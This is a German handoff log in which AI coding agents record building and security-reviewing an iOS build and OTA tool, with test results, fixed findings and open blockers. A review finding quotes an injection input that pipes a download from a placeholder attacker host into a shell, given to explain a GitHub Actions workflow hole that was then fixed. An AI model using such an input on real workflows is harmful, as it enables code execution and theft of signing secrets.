# Handoff

Der jeweils letzte Eintrag steht oben.

---

## 2026-09-20 - CODEX (Folgearbeit nach dem Review)

**Agent:** CODEX
**Rolle:** IMPLEMENTATION
**Task-IDs:** BB-011, BB-008
**Startcommit:** `58808d1` (Ende des Phase-1-Reviews)
**Endcommit:** siehe Branch `codex/bb-011-fetch-artifact`
**Basis:** `codex/bb-review-phase1` - die Review-Korrekturen werden gebraucht
**Umgebung:** Linux-Container - **weiterhin kein Windows, kein Mac**

### Was gemacht wurde

**BB-011 - `fetch_artifact` im GitHub-Executor.** Der im Review als letzter
Codeblocker markierte Punkt. Der Executor konnte starten und verfolgen, aber
die IPA nicht abholen; ein erfolgreicher Lauf endete mit "Executor meldet
Erfolg, liefert aber keine IPA".

Diese API hat zwei Fallen, beide abgeraeumt:

1. **Das Token wandert nicht mit.** GitHub antwortet auf den Download-Endpunkt
   mit einer 302 auf einen *anderen* Host. `urllib` folgt der Umleitung
   standardmaessig und schickt den `Authorization`-Header brav mit - haendigt
   das Token also dem Umleitungsempfaenger aus. Buergys Builds folgt jetzt
   selbst und laedt den Blob ohne jede Zugangsdaten. Ein Test prueft, dass am
   Blob-Host kein `Authorization` ankommt.
2. **Das Zip kommt aus dem Netz.** Eintragsnamen werden geprueft (`..`,
   fuehrender `/`, Laufwerksbuchstaben), entpackte Groesse und Eintragszahl
   sind gedeckelt, die IPA wird gegen die `.sha256`-Sidecar-Datei geprueft.

**BB-008 - Retention.** Die Konfiguration nannte seit jeher eine
Aufbewahrungsregel, durchgesetzt hat sie niemand; `data/` wuchs unbegrenzt.
`bb/retention.py` setzt sie jetzt um. `burgys retention` zeigt nur an,
`--apply` raeumt auf. Nie angefasst: laufende Builds, alles mit einer
veroeffentlichten OTA-Freigabe (deren Installationsseite zeigt per URL und
Pruefsumme genau darauf), und die neuesten N Artefakte je Projekt.

### Tests

**223 Tests, gruen, 0 uebersprungen** (vorher 186).

- 24 neue Tests fuer den Artefakt-Download gegen einen lokalen Stub der
  Actions-API, darunter ein **Ende-zu-Ende-Lauf durch den ganzen Controller**:
  Dispatch, Poll, Download, IPA-Verifikation, OTA-Release mit QR-Code und
  korrekt hochgezaehltem Build-Limit. Das ist der Beweis, dass BB-011
  tatsaechlich BB-006 entsperrt.
- 13 neue Tests fuer Retention.
- Mutationsgeprueft wie im Review: 13 neue Sicherungen einzeln kaputtgemacht.

Dabei zwei eigene Testschwaechen gefunden und behoben:

- Die beiden Zip-Slip-Schranken (Namenspruefung und Containment) **maskierten
  sich gegenseitig**: einzeln entfernt fiel keine auf, weil die andere
  ansprang. Erst das Entfernen *beider* wurde bemerkt. Behoben, indem der Test
  jetzt die konkrete Fehlermeldung prueft statt nur den Ausnahmetyp - damit ist
  jede Schranke einzeln festgenagelt. Die zweite Schranke ist heute durch die
  erste unerreichbar; sie bleibt als Reserve drin und ist im Code so
  kommentiert.
- Eine Zusicherung griff nach `/tmp` statt nur in den eigenen Testbaum und
  konnte durch fremde Dateien gruen oder rot werden. Eingegrenzt.

Endstand: 13/13 neue Mutanten gefunden, zusammen mit dem Review 48/48.

### Gefundene Fehler

Keine neuen im bestehenden Code. Die beiden bearbeiteten Punkte waren als
BB-I-002 und BB-I-003 bereits bekannt und sind jetzt geschlossen.

### Offene Blocker

Unveraendert, aber **einer weniger** - es gibt keinen Codeblocker mehr:

1. **Windows-Abnahme steht aus.** `python tests\windows_check.py` auf dem HP.
2. **Kein macOS-Executor freigegeben** - Sebastians Entscheidung, plus die
   geschuetzte Umgebung `ios-signing`.
3. **`build_number_floor` unbekannt** - nur aus App Store Connect zu holen.
4. **`local_path`** fehlt fuer beide Projekte.

### Empfohlener naechster Schritt

Unveraendert bei Sebastian: Windows-Abnahme, `build_number_floor`, dann die
Entscheidung ueber den GitHub-Weg. Auf der Codeseite ist alles bereit.

Falls noch etwas Freies gewuenscht ist, waere BB-009 (`ota_publish_dir` plus
`burgys publish`) der naechste sinnvolle Schritt - er macht aus dem heutigen
Kopieren von Hand einen Befehl, ohne die Live-Seite automatisch anzufassen.

**STOPP weiterhin eingehalten:** kein echter macOS-Build, kein kostenpflichtiger
Dienst, kein App-Store-Upload, keine Zertifikate oder Profile veraendert, kein
Codemagic-Workflow angefasst, keine IPA ersetzt.

---

## 2026-09-20 - CODEX (Review)

**Agent:** CODEX
**Rolle:** REVIEW (unabhaengiger Code-, Security-, CI/CD- und Test-Reviewer)
**Startcommit:** `514ba0f`
**Endcommit:** `5d67182` (Branch `codex/bb-review-phase1`)
**Umgebung:** Linux-Container, Python 3.11.15 - **kein Windows, kein Mac**

### Tests

Claudes Angabe von 137 Tests ist **reproduziert**: `Ran 137 tests - OK`,
0 uebersprungen, deterministisch ueber drei Laeufe, ohne Netz
(`HTTPS_PROXY` entfernt), ohne Zugriff auf `$HOME`, ohne Rueckstaende in `/tmp`.

Gruene Tests wurden **nicht** als Beweis akzeptiert. Stattdessen Mutationstests:
26 Sicherungsmechanismen einzeln kaputtgemacht und geprueft, ob die Suite das
merkt. Ergebnis im Ausgangszustand: **22 von 26 gefunden, 4 nicht**.

Die vier blinden Flecken waren:

| Mechanismus | Warum es niemand gemerkt haette |
|---|---|
| `verify.py` Bundle-ID-Pruefung | ganz ohne Test |
| `verify.py` Buildnummern-Pruefung | ganz ohne Test - ausgerechnet die App-Store-kritische |
| Freigabe-Gate (Abschnitt 29) | alle Tests setzten `require_approval_for_mac_builds=False` |
| `safe_child` Containment-Pruefung | Tests trafen nur die Vorpruefungen, nie die eigentliche Schranke |

Nach den Korrekturen: **35 Mutanten, 35 gefunden, keiner ueberlebt.**

Suite jetzt: **186 Tests, gruen.**

### Windows-Test

**NICHT DURCHGEFUEHRT - und das ist der wichtigste offene Punkt.**

Diese Review-Sitzung lief in einem Linux-Container (`os.name='posix'`, kein
`cmd.exe`, kein PowerShell, kein Wine). Eine Windows-Ausfuehrung war von hier
aus unmoeglich. Wer etwas anderes behauptet, hat nicht nachgesehen.

Stattdessen: statische Pruefung auf POSIX-Annahmen (Ergebnis: der Code ist
sauber - `os.replace`, `mkdir`-Locks, `pathlib`, keine `fcntl`/`pwd`/`grp`,
Pfadkomponenten lehnen beide Trennzeichen ab) **plus** ein Abnahmeskript, das
Sebastian auf dem HP ausfuehrt:

```
cd burgys-builds
python tests\windows_check.py
```

14 Pruefungen: Umlaut- und Leerzeichenpfade, Pfade >260 Zeichen, atomares
Ersetzen, Ersetzen bei offenem Handle (Virenscanner-Fall), Sperren ueber acht
echte Prozesse, git, `npm.cmd`, Dateirechte, exklusive Portbindung inklusive
Uebernahmeversuch, QR-Dateien, IPA-Inspektion, volle Suite. Laeuft es nicht
unter Windows, sagt es das und gibt sich ausdruecklich nicht als Abnahme aus.

### Security

Vier Befunde, alle behoben:

1. **Workflow-Injection (hoch).** Das Template schrieb **16** `${{ }}`-Ausdruecke
   direkt in `run:`-Shellskripte. GitHub ersetzt die *vor* der Shell, also
   fuehrt eine Eingabe wie `x"; curl angreifer|sh; #` Code aus - in einem Job,
   der auf einem **oeffentlichen** Repo das Distribution-Zertifikat und dessen
   Passwort haelt. Behoben: alle Werte ueber `env:`, Zugriff als `"$VAR"`,
   null Ausdruecke in Shellzeilen, plus ein Validierungsschritt, der jede
   Eingabe gegen ein Muster prueft, bevor sie irgendetwas anfasst.
2. **Signing-Secrets ohne menschliche Schranke (hoch).** Die Secrets lagen am
   Repository, also fuer jeden Dispatch erreichbar. Behoben: der Job laeuft in
   `environment: ios-signing`; die Secrets gehoeren an diese Umgebung mit
   *Required reviewers*. Damit ist die Freigabe aus Abschnitt 29 dort
   durchgesetzt, wo die Schluessel liegen.
3. **Port-Uebernahme unter Windows (mittel, Windows-spezifisch).**
   `allow_reuse_address = True` heisst unter Windows etwas anderes als unter
   POSIX: ein *zweiter* Prozess darf denselben aktiv benutzten Port binden und
   gewinnt. Jede Anfrage an diese API traegt das Agent-Token im Header. Behoben:
   `SO_EXCLUSIVEADDRUSE` und kein `SO_REUSEADDR` unter Windows.
4. **Kein Host-Header-Check (niedrig).** DNS-Rebinding war durch die
   Tokenpflicht bereits abgefangen, aber eine Allowlist kostet nichts. Ergaenzt.

Geprueft und in Ordnung: kein `pull_request`/`pull_request_target`-Trigger
(Fork-PRs erreichen die Secrets nicht), `permissions: contents: read`, kein
`GITHUB_TOKEN`-Gebrauch, `persist-credentials: false` ergaenzt, keine
Zertifikate/Schluessel/Tokens im Repository (Dateiendungen und Inhalte
durchsucht), Schwaerzung greift in Audit-Log, Manifest und API-Antworten.

### Cost Guard

Faellt geschlossen aus - unabhaengig nachgeprueft: alle PAID-Ressourcen
blockiert, unbekannte Ressourcen als PAID behandelt, erschoepftes
Freikontingent ohne kostenpflichtigen Fallback, Ledger ueberlebt Neustart.

**Eine Anforderung fehlte aber:** Abschnitt 5 verlangt eine Allowlist normaler
Standard-Runner. Es gab **keine** - `runs-on` wurde nirgends geprueft, nur in
einem Kommentar erwaehnt. Ein Wechsel auf `macos-15-xlarge` waere durchgelaufen
und haette Geld gekostet. Ergaenzt: `STANDARD_MACOS_RUNNERS`, `runs_on` ist
jetzt Pflicht im `executor_config`, ein fehlendes Label blockiert, und ein Test
haelt Template und Allowlist zusammen.

### GitHub Runner

Beide Pilot-Repos ueber die GitHub-API bestaetigt: `"private": false`,
`visibility: "public"`, 0 Forks. Template nutzt `macos-latest` - Standard-Runner,
auf oeffentlichen Repos kostenlos und unbegrenzt. Keine kostenpflichtigen
Marketplace-Actions (nur `actions/checkout` und `actions/upload-artifact`),
keine versteckte Cloud-Mac-Abhaengigkeit.

### Signing

Claudes Angaben aus den Artefakten selbst nachgelesen, **bestaetigt**:
Team `38A4N26LD5`, beide Ad-Hoc-Profile mit je **2** registrierten Geraeten,
Ablauf **2027-08-14 15:15:33**, `get-task-allow: false`, gemeinsames
Distribution-Zertifikat. Keine UDIDs notiert, keine Zertifikate angefasst.

### OTA

Der bestehende Installer bleibt unangetastet. Das erzeugte Manifest ist
byte-identisch mit dem ausgelieferten - nachgerechnet. Die OTA-Ablehnungen
(Dry Run, falsche Signierung, abgelaufenes Profil, fremde Bundle ID, `http`)
greifen alle, jede einzeln mutationsgeprueft.

### Thy-Gnosis-Befund

**CONFIRMED** - unabhaengig nachgerechnet.

| | Groesse | SHA-256 |
|---|---|---|
| `web/index.html` in `thy-gnosis.ipa` | 55'844 B | `763e2efc41799f4a33c0938fafa28f01858ac2baba40460a17c5bee0c6c9a25d` |
| `web/index.html` auf `main` (`242f5e44534a6da7`) | 57'952 B | `86d261ed51c89d6a5bdb7774d01393b357f7721c5dd42e882f10b88769316514` |
| Browser-Version auf Pages | 58'199 B | `75ec2268d7a5ba4edf3bc8faf5550806d12ff2c6f5c40467cbaaee58a848749c` |

IPA gebaut 2026-09-12 21:58:58, QA-Fixes-Commit `242f5e4` vom 2026-09-13 16:24.

**Zusaetzlich, von Claude nicht dokumentiert: Days of Ruin ist genauso
betroffen.** IPA 63'817 B / `960944f2c37d8aaa1c965f75150796c0250c8e964fb8e60dac9f48bf0d27f750`
gegen `main` (`58400f7`) 65'885 B / `8850e7afb71da8c4e486732759d785779df05c248898e94232cedea1b054bfcf`.

Keine IPA ersetzt.

### Gefundene Fehler

| Nr | Schwere | Befund |
|---|---|---|
| C-01 | hoch | Workflow-Injection: 16 `${{ }}` in `run:`-Blocks, Repo oeffentlich, Job haelt Signing-Secrets |
| C-02 | hoch | Signing-Secrets am Repository statt an geschuetzter Umgebung - keine menschliche Schranke |
| C-03 | mittel | Anforderung aus Abschnitt 5 fehlte: keine Runner-Allowlist, Larger Runner waere durchgelaufen |
| C-04 | mittel | `allow_reuse_address` erlaubt unter Windows Port-Uebernahme; Token liegt im Header |
| C-05 | mittel | `verify.py` Bundle-ID- und Buildnummern-Pruefung komplett ungetestet |
| C-06 | mittel | Freigabe-Gate (Abschnitt 29) komplett ungetestet |
| C-07 | niedrig | `safe_child`-Containment ungetestet (nur Vorpruefungen getroffen) |
| C-08 | niedrig | `permissions_ok()` meldete unter Windows "ok", ohne je geprueft zu haben - ein Scheinerfolg |
| C-09 | niedrig | `os.replace` ohne Retry; unter Windows scheitert es an offenen Handles (Virenscanner) |
| C-10 | niedrig | Rate Limit nach IP - alle Aufrufer sind 127.0.0.1, ein lauter Client sperrt die anderen aus |
| C-11 | niedrig | Kein Host-Header-Check (DNS-Rebinding-Haertung) |
| C-12 | niedrig | Keine `.gitattributes`; `burgys.cmd` mit LF statt CRLF |
| C-13 | Info | 3 von 137 Tests liefen nur, wenn zufaellig eine 5-MB-IPA daneben lag |
| C-14 | Info | Drift betrifft beide Apps, dokumentiert war nur Thy Gnosis |

### Behobene Fehler

C-01 bis C-14 - alle. Jede Aenderung ist durch einen Test abgesichert, und
jeder neue Schutz wurde mutationsgeprueft (kaputtmachen, Rotwerden pruefen).

`verify.py` laesst sich jetzt ohne die echte IPA testen: `tests/helpers.py`
baut synthetische, lesbare IPAs (Ad Hoc, App Store, Development, abgelaufen,
unsigniert, ohne `web/`). Die Tests gegen die echte IPA bleiben zusaetzlich.

**Nicht geaendert**, weil es eine Entscheidung und kein Fehler ist: die
Export-Methode `ad-hoc`/`app-store`. Xcode 15.3 hat sie zugunsten von
`release-testing`/`app-store-connect` als veraltet markiert; beide gelten
derzeit. Das Template ist jetzt umschaltbar
(`BURGYS_EXPORT_METHOD_ADHOC`/`_STORE`) und der Punkt steht in
`KNOWN_ISSUES.md` als Risiko fuer den ersten echten Lauf.

### Offene Blocker

1. **Windows-Abnahme steht aus.** `python tests\windows_check.py` auf dem HP.
   Bis dahin ist Buergys Builds unter Windows ungeprueft.
2. **Kein macOS-Executor freigegeben.** Weg ist vorbereitet und kostenlos,
   braucht Sebastians Entscheidung und die geschuetzte Umgebung.
3. **`build_number_floor` weiterhin unbekannt.** Im Review gesucht und **nicht**
   gefunden: keine Git-Tags in beiden Repos, `project.yml` steht auf `1`, beide
   IPAs tragen `CFBundleVersion 1`, Codemagic setzt `$BUILD_NUMBER` erst zur
   Laufzeit. Es gibt lokal **keine** Spur der an App Store Connect
   uebermittelten Nummern. Bleibt Blocker - keine Nummer geraten.
4. **`local_path`** fehlt fuer beide Projekte (nur auf dem HP zu setzen).
5. **BB-I-003:** `fetch_artifact` im GitHub-Executor fehlt weiterhin. Ohne das
   endet ein echter Build mit "liefert aber keine IPA".

### Empfohlener naechster Schritt

1. Sebastian: `python tests\windows_check.py` auf dem HP, Ausgabe zurueckgeben.
2. Sebastian: `build_number_floor` aus App Store Connect ablesen
   (App > TestFlight > iOS-Builds), fuer beide Apps.
3. Codex/Claude: BB-I-003 (`fetch_artifact`) - der letzte Codeblocker vor einem
   echten Build.
4. Erst danach, und nur mit Sebastians ausdruecklicher Freigabe: geschuetzte
   Umgebung einrichten, Secrets setzen, **erster Lauf von Hand in der
   Actions-Oberflaeche**, zusehen, Export-Methode pruefen.

**STOPP eingehalten:** kein echter macOS-Build gestartet, kein kostenpflichtiger
Dienst aktiviert, kein App-Store-Upload, keine Zertifikate oder Profile
veraendert, kein Codemagic-Workflow geloescht oder deaktiviert, keine IPA
ersetzt.

---

## 2026-09-20 - Claude (Lead)

**Task-ID:** BB-001, BB-002, BB-003
**Start-Commit:** `fa99ef8`
**End-Commit:** siehe Branch `claude/burgys-builds-ios-platform-k53703`
**Umgebung:** Linux-Container, Python 3.11.15 - **nicht** Sebastians HP

### Geaenderte Dateien

Neu:

```
burgys-builds/bb/            22 Module
burgys-builds/tests/         9 Dateien, 137 Tests
burgys-builds/config/        burgys.json, projects.json
burgys-builds/templates/     burgys-ios-build.yml
burgys-builds/bin/           burgys, burgys.cmd
docs/                        12 Dokumente
.burgys/                     6 Dateien
.gitignore
```

Bestehende Dateien: **keine geaendert.** `index.html`, die `.plist`-Manifeste,
die IPAs, `sync_web.py` und die Browser-Versionen sind unberuehrt. Nur `README.md`
hat einen Abschnitt dazubekommen.

### Ausgefuehrte Tests

```
python -m unittest discover -s tests -t tests
Ran 137 tests - OK
```

Dazu, gegen die echten Daten und nicht gegen Fixtures:

- Preflight gegen den echten `thy-gnosis-ios`-Klon: 13/13 gruen, inklusive des
  projekteigenen `npm run check`
- IPA-Inspektion an `thy-gnosis.ipa` und `days-of-ruin.ipa`: Bundle ID, Version,
  Buildnummer, Profil, Ablauf, Geraeteanzahl, SHA-256
- Das erzeugte OTA-Manifest ist **byte-identisch** mit dem live ausgelieferten
  `thy-gnosis.plist`
- Agent API live gegen einen laufenden Server: Auth, Scopes, Rate Limit,
  Path Traversal, Schwaerzung
- Cross-Prozess-Sperren mit 8 echten Prozessen

### Was dabei gefunden wurde

1. **Die ausgelieferte iPhone-App ist einen Stand hinter der Browser-Version**
   (BB-I-004). Nachgerechnet, nicht vermutet.
2. **Beide App-Repos sind oeffentlich** - damit sind GitHub-Actions-macOS-Runner
   kostenlos. Das ist der Weg zum Pilot ohne einen Franken Kosten (BB-D-003).
3. **Ein Fehler im eigenen Code**, gefunden vom eigenen Test: das
   Verzeichnis-Lock konnte in dem Moment als "stale" gebrochen werden, in dem
   das Verzeichnis schon existierte, die Besitzerdatei aber noch nicht
   geschrieben war. Zwei Prozesse haetten dieselbe Buildnummer bekommen koennen.
   Behoben; es gibt jetzt einen Test mit acht echten Prozessen.
4. **Der Days-of-Ruin-Button ist noch pink** (BB-I-001), obwohl ein Commit ihn
   giftgruen machen wollte.

### Offene Probleme

- BB-I-003: `fetch_artifact` fehlt im GitHub-Executor - blockiert BB-006
- BB-I-002: Aufbewahrung raeumt noch nicht auf
- BB-I-006: unter Windows noch nicht gelaufen
- `local_path` und `build_number_floor` muessen vom HP kommen

### Was ausdruecklich NICHT erreicht ist

**Es gibt keine von Buergys Builds erzeugte IPA.** Kein Mac, kein freigegebener
macOS-Executor. Der Zustand ist IMPLEMENTED und TESTED, nicht DEVICE VERIFIED und
nicht PRODUCTION VERIFIED. Der `none`-Executor sagt genau das, statt etwas
vorzutaeuschen.

### Empfohlener naechster Schritt

Sebastian:

1. `docs/INVENTORY.md` lesen, besonders BB-I-004
2. Auf dem HP: `python -m bb.cli init`, dann `doctor`, dann `local_path`
   eintragen, dann `preflight thy-gnosis`
3. Entscheiden, ob der GitHub-Actions-Weg eingerichtet wird (`MAC_EXECUTOR.md`,
   kostenlos, aber seine Entscheidung)

Codex: BB-011 (`fetch_artifact`) und BB-012 (Review von v0.1). Vor dem Review
`.burgys/DECISIONS.md` lesen - einiges, was nach einer Luecke aussieht, ist eine
bewusste Entscheidung.
